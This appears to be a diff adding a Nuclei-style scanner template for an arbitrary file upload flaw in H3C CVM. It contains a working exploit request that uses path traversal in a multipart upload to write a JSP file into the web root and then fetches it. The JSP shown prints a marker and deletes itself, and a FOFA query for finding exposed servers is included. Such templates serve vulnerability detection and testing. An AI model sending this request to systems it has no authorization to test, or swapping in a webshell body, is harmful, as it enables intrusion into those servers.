@@ -1,0 +1,56 @@
+id: h3c-cvm-fd-fileupload
+
+info:
+  name: H3C CVM - Arbitrary File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.
+  reference:
+    - https://github.com/wy876/POC/blob/main/H3C/H3C-CVM-fd%E6%8E%A5%E5%8F%A3%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: server="H3C-CVM"
+  tags: H3C-CVM-虚拟化管理平台
+  
+variables:
+  filename: "{{rand_base(5)}}"
+  payload: "{{rand_base(12)}}"
+
+http:
+  - raw:
+      - |
+        POST /cas/fileUpload/fd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.123 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Connection: close
+
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="token"
+
+        /../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{filename}}.jsp
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/png
+
+        <% out.print("{{payload}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --WebKitFormBoundaryMMqEBbEFHlzOcYq4--
+      - |
+        GET /cas/js/lib/buttons/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "{{payload}}"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100afc1760cfa434e367bb33df7f5637dadba8e63aa69c0df3f897704c8ee24ade602200cd025b7689fc691584f540db3067bcbfcc557430f59d59d2b9b8f86b015b74c:922c64590222798bb761d5b6d8e72950
